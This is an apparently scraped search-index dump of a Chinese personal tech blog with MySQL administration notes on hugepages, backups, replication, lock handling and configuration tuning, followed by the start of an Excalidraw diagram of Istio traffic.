/sys/kernel/mm/transparent_hugepage/defrag; then echo never \u003e /sys/kernel/mm/transparent_hugepage/defrag fi # 设置2mb一个的hugepage，400个，就是800m。 # 在mysql的启动日志中，会有记录需要的内存数量：Initializing buffer pool, total size = 768M 略大即可 echo 410 \u003e /proc/sys/vm/nr_hugepages # mysql所在的用户组 echo 1000 \u003e /proc/sys/vm/hugetlb_shm_group /usr/sbin/ntpdate ntp.shu.edu.cn \u003e\u003e /var/log/rc.log /usr/sbin/hwclock -w \u003e\u003e /var/log/rc.log ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql_hugepages%E9%85%8D%E7%BD%AE/:1:2","series":null,"tags":["blog","mysql"],"title":"mysql_hugepages配置","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql_hugepages%E9%85%8D%E7%BD%AE/#centos-系统设置"},{"categories":["blog"],"content":" centos 开启 hugepages 后的内存pagetables 减小不明显，但是确实减小了。我在看的时候，发现系统用到了 swap 内存，可能我的内存还是设置过大了 在 mysql 日志中有初始化内存的大小显示。那就是要用到的 hugepage 大小 [root@centos1 ~]# cat /proc/meminfo MemTotal: 1016460 kB MemFree: 69104 kB MemAvailable: 11624 kB Buffers: 0 kB Cached: 16892 kB SwapCached: 14032 kB Active: 35168 kB Inactive: 38428 kB Active(anon): 28708 kB Inactive(anon): 28676 kB Active(file): 6460 kB Inactive(file): 9752 kB Unevictable: 0 kB Mlocked: 0 kB SwapTotal: 839676 kB SwapFree: 642936 kB Dirty: 0 kB Writeback: 0 kB AnonPages: 48832 kB Mapped: 6296 kB Shmem: 604 kB Slab: 32648 kB SReclaimable: 11772 kB SUnreclaim: 20876 kB KernelStack: 2160 kB PageTables: 3688 kB NFS_Unstable: 0 kB Bounce: 0 kB WritebackTmp: 0 kB CommitLimit: 938304 kB Committed_AS: 757564 kB VmallocTotal: 34359738367 kB VmallocUsed: 5468 kB VmallocChunk: 34359730176 kB HardwareCorrupted: 0 kB AnonHugePages: 0 kB HugePages_Total: 400 HugePages_Free: 385 HugePages_Rsvd: 385 HugePages_Surp: 0 Hugepagesize: 2048 kB DirectMap4k: 32704 kB DirectMap2M: 1015808 kB ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql_hugepages%E9%85%8D%E7%BD%AE/:1:3","series":null,"tags":["blog","mysql"],"title":"mysql_hugepages配置","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql_hugepages%E9%85%8D%E7%BD%AE/#centos-开启-hugepages-后的内存"},{"categories":["blog"],"content":" 验证是否成功如果报错，没有成功使用大页,错误日志中会有 warning 2017-07-12T14:47:00.662616Z 0 [Warning] InnoDB: Failed to allocate 138412032 bytes. errno 12 2017-07-12T14:47:00.697358Z 0 [Warning] InnoDB: Using conventional memory pool ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql_hugepages%E9%85%8D%E7%BD%AE/:1:4","series":null,"tags":["blog","mysql"],"title":"mysql_hugepages配置","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql_hugepages%E9%85%8D%E7%BD%AE/#验证是否成功"},{"categories":["blog"],"content":"mysql备份恢复","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E5%A4%87%E4%BB%BD%E6%81%A2%E5%A4%8D/","series":null,"tags":["blog","mysql"],"title":"mysql备份恢复","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E5%A4%87%E4%BB%BD%E6%81%A2%E5%A4%8D/"},{"categories":["blog"],"content":" 简介这里介绍 mysql 的几种备份恢复方法. into outfile，适合在工作中导出指定的报表数据等 mysqldump 轮流进行锁表 innobakcupex(暂时发现最好用的备份工具，且开源) ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E5%A4%87%E4%BB%BD%E6%81%A2%E5%A4%8D/:1:0","series":null,"tags":["blog","mysql"],"title":"mysql备份恢复","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E5%A4%87%E4%BB%BD%E6%81%A2%E5%A4%8D/#简介"},{"categories":["blog"],"content":" into outfile—load infile # 导入到指定的文件位置 select * into outfile 'secure_file_priv' fields terminated by ',' from test # 导入指定的文件到表 load data infile '/var/lib/mysql-files/20170628' into table test fields terminated by ','; # 注意 secure_file_priv路径位置，否则无法导出 # 注意 表必须存在，然后导入数据。 并不是删除表后可以重建表 ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E5%A4%87%E4%BB%BD%E6%81%A2%E5%A4%8D/:2:0","series":null,"tags":["blog","mysql"],"title":"mysql备份恢复","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E5%A4%87%E4%BB%BD%E6%81%A2%E5%A4%8D/#into-outfile---load-infile"},{"categories":["blog"],"content":" mysqldump 导出为 sql 脚本，可以直接运行进行恢复 # 指定表 mysqldump -u root -p databasename tablename \u003e /tmp/20170628_databasename_tablename.sql # 指定数据库 mysqldump -u root -p --databases databasename1 databasename2 \u003e /tmp/20170628_databasename.sql # 备份全部数据库 mysqldump -u root -p -all-databases \u003e /tmp/20170628_databasename.sql ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E5%A4%87%E4%BB%BD%E6%81%A2%E5%A4%8D/:3:0","series":null,"tags":["blog","mysql"],"title":"mysql备份恢复","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E5%A4%87%E4%BB%BD%E6%81%A2%E5%A4%8D/#mysqldump-导出为-sql-脚本可以直接运行进行恢复"},{"categories":["blog"],"content":" innobackupex 的使用 (这个是 xtrabackup 的封装，可以备份多种类的存储引擎文件) # 备份 innobackupex --user=root --password=password /tmp/backups # 把备份里面日志等进行检查提交操作，让备份可以正常使用 innobackupex --apply-log /extrabackup/2016-04-27_07-30-48/ # 这里需要把文件全部都清空，并且需要注意文件的所有者、读写权限。 # 进行恢复，然后重启即可正常使用 innobackupex --copy-back /tmp/backups/2017-07-02_00-51-21/ # 增量备份 innobackupex --user=root --password=password /tmp/backups --incremental --incremental-basedir=/tmp/backups/full_bak # 增量恢复 innobackupex --apply-log --redo-only /tmp/backups/full_bak --incremental-dir=/tmp/backups/incremental_bak # 在上面要注意--redo-only参数,在合并最后一个增量备份的时候，不需要加上这个参数！！ # 如果没有redo-log这个参数，会进行回滚操作。将无法添加增量事务。最后一个因为则没有了后续的增量事务。 关于 redo-only，我翻来覆去看了官网文档和各种 blog，想了 2 天……终于理解了。 在完全备份的时候，数据库可能正在进行一个 update 操作，数据量很大，时间很长，差不多需要 2 天时间。为了保证备份可用，进行了回滚操作。在日志中 update 语句没有能够正确保存结果到备份。 在第二天，你开始进行增量备份。这一个 update 已经完成了操作，日志只记录并且进行 commit 提交。由于之前的备份进行了回滚，导致这个 commit 是不成功的。这一个 update 操作回滚掉后，没有了数据需要提交。 这样下来，就造成了数据的丢失。 在官方文档中说，无法添加后续的增量事务。应该是说这个 update 操作后续 (完成备份后第二天 update 语句进行的操作) 的改动，都没有办法应用。 同理，无论第一步中式完全备份还是增量备份，都会导致这个问题。所以使用 redo-only 参数保证 update 操作在是最后一个可用备份之前，没有回滚掉。 如果在之后的备份中，日志记录了提交或者回滚，则正常提交或回滚了这个 update 操作的数据。 如果没有后续记录，则说明这个 update 操作还没有完成，为了保证备份可用，回滚掉。并将在之后的备份中进行 commit 或回滚,而不进行 redo-only 第六步中都保证了备份可用。 ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E5%A4%87%E4%BB%BD%E6%81%A2%E5%A4%8D/:4:0","series":null,"tags":["blog","mysql"],"title":"mysql备份恢复","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E5%A4%87%E4%BB%BD%E6%81%A2%E5%A4%8D/#innobackupex-的使用-这个是-xtrabackup-的封装可以备份多种类的存储引擎文件"},{"categories":["blog"],"content":" 冷备份 关掉 mysql 直接拷贝数据文件 到指定机器上面粘贴即可 注意：只有 myisam 存储引擎的表，才能这样备份！ ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E5%A4%87%E4%BB%BD%E6%81%A2%E5%A4%8D/:5:0","series":null,"tags":["blog","mysql"],"title":"mysql备份恢复","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E5%A4%87%E4%BB%BD%E6%81%A2%E5%A4%8D/#冷备份"},{"categories":["blog"],"content":"有时候会自建 mysql [[笔记/point/mysql|mysql]] 测试配置. 所以记录一下配置和操作.","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/","series":null,"tags":["blog","mysql","docker"],"title":"mysql教程","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/"},{"categories":["blog"],"content":" 简介有时候会自建 mysql 测试配置. 所以记录一下配置和操作. ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog","mysql","docker"],"title":"mysql教程","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 安装","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog","mysql","docker"],"title":"mysql教程","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/#安装"},{"categories":["blog"],"content":" docker 启动 # 名称ken-mysql # 数据在本地/data/mysql-data # 密码123 # 配置了字符集 # 优化资源占用 --table-open-cache=400 --table-definition-cache=400 --performance-schema=OFF docker run --name ken-mysql -v /data/mysql-data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123 -p3306:3306 -d mysql:latest --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["blog","mysql","docker"],"title":"mysql教程","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/#docker-启动"},{"categories":["blog"],"content":" apt 仓库使用 mysql-清华大学开源软件镜像站 vim /etc/apt/sources.list.d/mysql-community.list deb https://mirrors.tuna.tsinghua.edu.cn/mysql/apt/ubuntu jammy mysql-8.0 mysql-tools apt update -y apt install mysql-server systemctl status mysql ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","mysql","docker"],"title":"mysql教程","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/#apt-仓库"},{"categories":["blog"],"content":" deb 安装 mkdir mysql cd mysql # 下载地址 https://downloads.mysql.com/archives/community/ wget https://downloads.mysql.com/archives/get/p/23/file/mysql-server_5.7.36-1ubuntu18.04_amd64.deb-bundle.tar # 解压 tar xvf mysql-server_5.7.36-1ubuntu18.04_amd64.deb-bundle.tar # 删掉测试包 rm -rf mysql-community-test_5.7.36-1ubuntu18.04_amd64.deb mysql-testsuite_5.7.36-1ubuntu18.04_amd64.deb # 安装依赖 apt install libtinfo5 libmecab2 -y # 安装 dpkg -i mysql*.deb # 配置 systemctl enable mysql --now mysql -uroot -p password ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","mysql","docker"],"title":"mysql教程","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/#deb-安装"},{"categories":["blog"],"content":" 集群 slave要点: 主节点可以写. 从节点 read_only=1 不能写. 挂了以后切换到从节点, 只能读. 或者 从节点可以写. 但是主节点挂了以后, 不再自动切换过去 master 节点操作 # /etc/mysql/mysql.conf.d/mysqld.cnf 配置文件开启 [mysqld] log-bin server-id=1 # 重启mysql systemctl restart mysql # 登录创建用户 show master status; CREATE USER 'slave'@'%' IDENTIFIED BY 'slave'; grant replication slave, replication client on *.* to 'slave'@'%'; flush privileges; flush table with read lock; mysqldump -uroot -pmsb123 -A -B --events --source-data=2 \u003e /root/mysql/db-bak-all.sql unlock tables; slave 节点操作 # 安装好mysql后,拷贝master的db-bak-all.sql文件过来 mysql -uroot -p \u003c/root/mysql/db-bak-all.sql systemctl restart mysql # 下面要ip、用户名、密码、log文件、log-id。后面两个是show master status;的输出 change master to master_host='master节点的ip', master_user='slave', master_password='slave', # db-bak-all.sql的头部会有写这两个值. # 示例 CHANGE MASTER TO MASTER_LOG_FILE='binlog.000003', MASTER_LOG_POS=157; MASTER_LOG_FILE='mysql-bin-bin.000001', MASTER_LOG_POS=769 ; # 验证 show slave status\\G 正常情况切换主库. 或者主库坏了, 延迟很低. 不需要追补数据的时候. # 主库只读 set global read_only=ON; set global super_read_only=ON; # 查看状态 # slave_io_runnning,slave_sql_runnning 是yes 说明同步正常 # seconds_behind_master为0,说明没有延迟.10就是10秒 show slave status\\G # 确保gtid一致. 主从都执行 select @@global.gtid_executed; # 从库停止slave,关闭只读 stop slave; reset slave all; set global read_only=off; set global super_read_only=off; # 主库 change master to ...... start slave; # 验证状态yes,延迟很低 show slave status\\G 追补数据需要在从库/新主库关闭 slave 后操作 主库无法启动. 但是有 binlog. select @@global.gtid_executed # 出现类似uuid的记录 # 生成sql,手动分析这还行 mysqlbinlog -vv --base64-output=decode-rows --exclude-gtids='uuid,uuid' /xxx/binlog-file \u003e /tmp/binlog-file.sql # 新主库没有写入数据,说明不会冲突,可以直接导入 mysqlbinlog -vv --base64-output=decode-rows --exclude-gtids='uuid,uuid' /xxx/binlog-file \u003e /tmp/binlog-file.sql | mysql -uroot -p -S /xxx/mysql.sock -P3306 主库可以启动. 新主库没有写入, 那么直接 changbe master 重新同步就好了. # https://github.com/liuhr/my2sql # 如果新主库有写入 my2sql -user xxx -password xxx -work-type 2sql -start-file /xxx/binlog-file -start-pos=10 --add-extraInfo --exclude-gtids='uuid' -output-dir /tmp/sql-folder # 会出现多个sql文件,选择性追加到新主库 相关链接 基于Keepalive + MySQL主从实现高可用架构 MySQL集群部署：一主多从 | 程序猿DD MySQL 主从切换步骤_mysql主从切换-CSDN博客 ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/:2:4","series":null,"tags":["blog","mysql","docker"],"title":"mysql教程","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/#集群-slave"},{"categories":["blog"],"content":" 双主集群主要原理： 不同的 server_id，使得节点在集群内唯一 开启 gtid 配置 通过不同的 auto_increment_offset 确定初始时的 id 不重复，通过 auto_increment_increment 确保自增 id 不重复 sync_binlog 为 1 确保事务的完整性 创建数据同步账户，执行 change master to...，然后 start slave A-master 认 B-master 是主节点. B-master 认 A-master 是主节点 开启 log-slave-updates 使得节点直接的数据会互相同步. 阿里云有 mgr 模式, 就是组复制. 这是更高级的集群模式 参考链接： MySQL集群部署：多主多从 | 程序猿DD MySql集群之双主双从架构\u0026集群主从配置（四）_双服务器主从模式怎么设置-CSDN博客 MYSQL-双主集群搭建 - 掘金 ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/:2:5","series":null,"tags":["blog","mysql","docker"],"title":"mysql教程","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/#双主集群"},{"categories":["blog"],"content":" 操作","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/:3:0","series":null,"tags":["blog","mysql","docker"],"title":"mysql教程","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/#操作"},{"categories":["blog"],"content":" 处理锁开启 performance_schema 参数, 才能查询这个库 查看相关情况 # 事务表 # state是running说明事务持有锁 select trx_mysql_thread_id '会话/线程id', trx_id 事务id, trx_state 事务状态, trx_started 事务开始时间, trx_tables_locked 锁表数量, trx_rows_locked 锁行数量 from information_schema.innodb_trx; # 锁住的表 select wait_started 开始等待的时间, wait_age 等待时长, wait_age_secs 等待秒数, locked_table 锁住的表, blocking_lock_id 事务id, blocking_pid 进程id, sql_kill_blocking_connection 解决办法 from sys.innodb_lock_waits where blocking_lock_id = '事务id'; # 查看客户端的连接信息:用户名,ip,端口,连接的数据库等 SELECT * FROM performance_schema.threads WHERE processlist_id = '会话/线程id' 查看具体事务内容 SELECT trx.trx_mysql_thread_id '会话/线程id', # 不是所有线程都有进程记录 select thread_id 线程id,processlist_id 进程id from performance_schema.threads; esh.event_name 'events_statements_history-事件名', esh.sql_text 'events_statements_history-sql' FROM information_schema.innodb_trx trx JOIN information_schema.processlist ps ON trx.trx_mysql_thread_id = ps.id JOIN performance_schema.threads th ON trx.trx_mysql_thread_id = th.processlist_id JOIN performance_schema.events_statements_history esh ON esh.thread_id = th.thread_id WHERE trx.trx_started \u003c CURRENT_TIME - INTERVAL 10 SECOND and trx.trx_mysql_thread_id = 35405 AND ps.USER != 'SYSTEM_USER' ORDER BY esh.EVENT_ID; 杀掉连接 # 杀死会话id kill 32 可以设置锁超时时间，自动杀掉超时会话 # 会话级别的锁超时，当前连接生效 set innodb_lock_wait_timeout=50; # 全局级别的锁超时，对新连接生效 set global innodb_lock_wait_timeout=50; Tracking MySQL query history in long running transactions ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/:3:1","series":null,"tags":["blog","mysql","docker"],"title":"mysql教程","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/#处理锁"},{"categories":["blog"],"content":" 用户/授权/密码 # 创建用户 CREATE USER 'ttt'@'%' IDENTIFIED BY '123456'; grant all privileges on *.* to 'ttt'@'%'; # 授权 GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER,INDEX,TRIGGER,CREATE VIEW,SHOW VIEW ON `db`.`table` TO 'ttt'@'%'; # 改密码 ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '123456'; FLUSH PRIVILEGES; ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/:3:2","series":null,"tags":["blog","mysql","docker"],"title":"mysql教程","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/#用户授权密码"},{"categories":["blog"],"content":" 查看 binlog使用 docker 镜像来临时解析 binlog 是不错的。 使用哪个版本可以在 mysql的docker页面 找到。注意只有 8.0.35-bullseye, 8.0-bullseye, 8.0.35-debian, 8.0-debian 这几个 -debian 的版本里有 mysqlbinlog 工具 docker run -d -v /root/binlog_folder/:/tmp/binlog_folder/ -e MYSQL_ROOT_PASSWORD=123456 --name mysql mysql:8.0-debia mysqlbinlog /tmp/binlog_folder/binlog_file \u003e xxx.txt ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/:3:3","series":null,"tags":["blog","mysql","docker"],"title":"mysql教程","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/#查看-binlog"},{"categories":["blog"],"content":" 配置","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/:4:0","series":null,"tags":["blog","mysql","docker"],"title":"mysql教程","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/#配置"},{"categories":["blog"],"content":" 最大连接数 # 配置最大连接数 show variables like '%max_connection%'; set global max_connections=1000; # 配置文件 [mysqld] max_connections = 1000 ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/:4:1","series":null,"tags":["blog","mysql","docker"],"title":"mysql教程","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/#最大连接数"},{"categories":["blog"],"content":" 慢 sql # 先配置保存的位置 # 如果是写入到file，那么就不会输出到表 show variables like \"%log_output%\"; set global log_output = file; set global log_output = \"TABLE\"; # 慢日志的地址 show variables like '%slow_query_log%' # 查看慢查询的定义 show global variables like 'long_query_time'; # 改成1秒就算慢查询 set global long_query_time=1 # 开启log show variables like \"general_log%\"; set global general_log = 'ON'; # 非常占用性能，测试完就关闭 SET GLOBAL general_log = 'OFF'; # 输出到表的话，就查这里 select * from mysql.slow_log; # 转换blob为text select CONVERT( `sql_text` USING utf8) from mysql.slow_log; # 配置文件 [mysqld] log_output = TABLE long_query_time = 1 general_log = ON ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/:4:2","series":null,"tags":["blog","mysql","docker"],"title":"mysql教程","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E6%95%99%E7%A8%8B/#慢-sql"},{"categories":["blog"],"content":"mysql启动参数优化","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E9%85%8D%E7%BD%AE%E8%A7%A3%E8%AF%BB/","series":null,"tags":["blog","mysql"],"title":"mysql配置解读","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E9%85%8D%E7%BD%AE%E8%A7%A3%E8%AF%BB/"},{"categories":["blog"],"content":" 简介这里是我总结的 mysql 配置文件配置项. ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E9%85%8D%E7%BD%AE%E8%A7%A3%E8%AF%BB/:1:0","series":null,"tags":["blog","mysql"],"title":"mysql配置解读","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E9%85%8D%E7%BD%AE%E8%A7%A3%E8%AF%BB/#简介"},{"categories":["blog"],"content":" 参数文件 [mysqld] ### # 基本相关配置 ### server-id=1 pid-file=/var/run/mysqld/mysqld.pid datadir=/var/lib/mysql socket=/var/lib/mysql/mysql.sock # 在linux中，文件可以进行ln，类似快捷方式。如果设置为1，则有可能会出现安全问题，默认配置中设置为0，进行关闭 symbolic-links=0 # 设置数据库字符集 character_set_server=utf8mb4 # 禁止MySQL对外部连接进行DNS解析，使用这一选项可以消除MySQL进行DNS解析的时间。但需要注意，如果开启该选项，则所有远程主机连接授权都要使用IP地址方式，否则MySQL将无法正常处理连接请求 skip-name-resolve character_set_filesystem=utf8mb4 # 统一使用小写的表名 lower_case_table_names = 1 ### # 日志配置 ### log-error=/var/log/mysqld.log # 二进制日志路径 log-bin=/tmp/logbin # 超过30天的binlog删除 expire_logs_days = 30 # 慢查询时间 超过1秒则为慢查询 long_query_time = 1 slow_query_log_file = /tmp/mysql-slow.log ### # 性能提升参数 ### # mysql最大连接数 查看max_used_connections，在最大值的70%左右最好 max_connections = 1000 # 官方：8 + (max_connections / 100)，上限100. 缓存的线程池不应该过多。 # 暂时我的业务高峰期，估计是200+的并发一直保持。50个应该足够 # 一般来说，大于4G的内存，预先缓存50个线程没有问题 thread_cache_size=10 # 表缓存分为多个区。5.7开始16为默认值，非常好！ # table_open_cache_instances=16 # 查询缓存关闭 # 听起来很美好的参数而已：如果表有insert、update等操作，表的相关所有cache失效 # 保存的是一个sql的查询结果集，而不是执行计划之类的 query_cache_size=0 # INNODB # innodb非常好！所以默认使用它做存储引擎。 设置为总内存的80% innodb_buffer_pool_size=800m # 为提高性能，MySQL可以以循环方式将日志文件写到多个文件。推荐设置为3 innodb_log_files_in_group = 3 # SHOW GLOBAL STATUS like '%innodb_os_log_written%' 单位：字节 # 官方推荐innodb_log_files_in_group*innodb_log_file_size * 0.75 \u003e 209MB，可以设置更大一些，但1小时内最好内进行一次刷入磁盘 innodb_log_file_size=140m ## 这里我启用的搭配模式，满足性能要求，系统一般情况下不会断电就不会崩溃。 # 控制数据库的事务日志刷到磁盘上 # 0:最快，但是进程崩溃就会丢失数据 # 1:最慢，数据会回滚没有提交的操作，数据保证一致 # 2:性能不错，除非操作系统不可用，才会丢失数据 innodb_flush_log_at_trx_commit=2 # 控制数据库的binlog刷到磁盘上 # 0:最快 系统决定 # n:10000\u003en\u003e1 多少条日志记录后开刷 # 1:每次提交就开刷 sync_binlog=0 # O_DIRECT直接跨过os缓存，直接写入到文件。 直接在raid上操作数据会更快 # 默认为空：fsync 直接连接到san存储，会更快 # O_DSYNC很少使用，没有上两个设置的优点 innodb_flush_method=O_DIRECT # 不限制线程并发的数量，在大型系统中会进行集群，同时会分配好任务，所以不需要调整 # 如果是单个的数据库，最高并发数量达到了100，那么设置为80，将会很好的满足需求 innodb_thread_concurrency=0 # mysql5.7的默认值，会提高速度 innodb_checksum_algorithm=crc32 # 不会有很大的提升，但是如果你的磁盘非常快，可以提高到16-32之间 innodb_read_io_threads=8 innodb_write_io_threads=8 # 刷新脏数据时每秒写 IO请求数 默认200即可，除非用sysbench压力测试，tps一段时间内为0，是因为它的问题。而且磁盘速度非常快 # 数值过大，mysql认为磁盘能力很强，不会着急得把redo log刷到磁盘。而不大或者100这样比较小的值，则会认为磁盘能力一般，提早刷入磁盘 innodb_io_capacity=200 # 关闭的时候把缓冲了的数据记录id记录到文件，启动的时候加载进来，这样尽可能的让它在重启的时候，缓冲数据完全一致 innodb_buffer_pool_load_at_startup=on innodb_buffer_pool_dump_at_shutdown=on ### # 连接相关参数 ### # 设置同一主机，最大可连接报错数。设置成100万没有特别大的影响，但是极大减少了flush hosts的次数 max_connect_errors=1000000 # 连接到达数量之后，排队的请求格式。超过600就会拒绝 back_log = 600 # 会话超过多久自动断开，默认秒，8小时 wait_timeout = 28800 # mysql可以打开的文件数 open_files_limit = 65535 ### # 备份工具innobackupex的备份路径 ### [xtrabackup] target_dir = /tmp/backups ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E9%85%8D%E7%BD%AE%E8%A7%A3%E8%AF%BB/:2:0","series":null,"tags":["blog","mysql"],"title":"mysql配置解读","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E9%85%8D%E7%BD%AE%E8%A7%A3%E8%AF%BB/#参数文件"},{"categories":["blog"],"content":" 随记为了搞定这一系列的参数，真是花了好大力气，也加深了对 mysql 的了解 2015-06-17 17:28:53 26720 [Warning] Buffered warning: Changed limits: max_connections: 5000 (requested 65535) 2015-06-17 17:28:53 26720 [Warning] Buffered warning: Changed limits: table_open_cache: 1995 (requested 2000) 这个问题的 解决办法 # 修改系统的参数 vi /etc/security/limits.conf # 加入这两行，或者把*指定为mysql用户 * soft nofile 65535 * hard nofile 65535 # 这个是mysql服务的参数，也要加上 mkdir /etc/systemd/system/mysqld.service.d //if not exists vi limits.conf [root@centos1 system]# cat /etc/systemd/system/mysql.service.d/override.conf [Service] LimitNOFILE=65535 ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql%E9%85%8D%E7%BD%AE%E8%A7%A3%E8%AF%BB/:3:0","series":null,"tags":["blog","mysql"],"title":"mysql配置解读","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql%E9%85%8D%E7%BD%AE%E8%A7%A3%E8%AF%BB/#随记"},{"categories":null,"content":"==⚠ Switch to EXCALIDRAW VIEW in the MORE OPTIONS menu of this document. ⚠== ","date":"0001-01-01","objectID":"/posts/%E9%99%84%E4%BB%B6/istio%E6%B5%81%E9%87%8F%E5%9B%BE.excalidraw/:0:0","series":null,"tags":["excalidraw"],"title":"","uri":"/posts/%E9%99%84%E4%BB%B6/istio%E6%B5%81%E9%87%8F%E5%9B%BE.excalidraw/#"},{"categories":null,"content":" Text Elementsk8s集群 ^f788j2ZP istio-ingress-gateway ^F3mBci1G 外部流量 ^Nmdejm4t Gateway ^QsvIUQTj VirtualService ^ljvgSDUB envoy ^Goth2t7M app ^kDjLQwUi service ^uxOwwsQ2 … ^CTEyeUYO pod ^PR8I0S4y ingress-svc ^93J0Or0x ingress-controller ^XE38ufrg %% ","date":"0001-01-01","objectID":"/posts/%E9%99%84%E4%BB%B6/istio%E6%B5%81%E9%87%8F%E5%9B%BE.excalidraw/:0:0","series":null,"tags":["excalidraw"],"title":"","uri":"/posts/%E9%99%84%E4%BB%B6/istio%E6%B5%81%E9%87%8F%E5%9B%BE.excalidraw/#text-elements"},{"categories":null,"content":" Drawing { \"type\": \"excalidraw\", \"version\": 2, \"source\": \"https://github.com/zsviczian/obsidian-excalidraw-plugin/releases/tag/2.0.6\", \"elements\": [ { \"type\": \"rectangle\", \"version\": 206, \"versionNonce\": 1857632095, \"isDeleted\": false, \"id\": \"fHSBjcQfF9upJ8XRgWq1J\", \"fillStyle\": \"solid\", \"strokeWidth\": 2, \"strokeStyle\": \"solid\", \"roughness\": 1, \"opacity\": 100, \"angle\": 0, \"x\": -385.1111111111111, \"y\": -195.69010416666674, \"strokeColor\": \"#1e1e1e\", \"backgroundColor\": \"transparent\", \"width\": 650.6666666666666, \"height\": 542.888888888889, \"seed\": 1158774639, \"groupIds\": [], \"frameId\": null, \"roundness\": { \"type\": 3 }, \"boundElements\": [], \"updated\": 1701851397125, \"link\": null, \"locked\": false }, { \"type\": \"text\", \"version\": 27, \"versionNonce\": 1701039807, \"isDeleted\": false, \"id\": \"f788j2ZP\", \"fillStyle\": \"solid\", \"strokeWidth\": 2, \"strokeStyle\": \"solid\", \"roughness\": 1, \"opacity\": 100, \"angle\": 0, \"x\": -348.4444444444444, \"y\": -177.0234375, \"strokeColor\": \"#1e1e1e\", \"backgroundColor\": \"transparent\", \"width\": 75.89996337890625, \"height\": 25, \"seed\": 1017416527, \"groupIds\": [], \"frameId\": null, \"roundness\": null, \"boundElements\": [], \"updated\": 1701830833489, \"link\": null, \"locked\": false, \"fontSize\": 20, \"fontFamily\": 1, 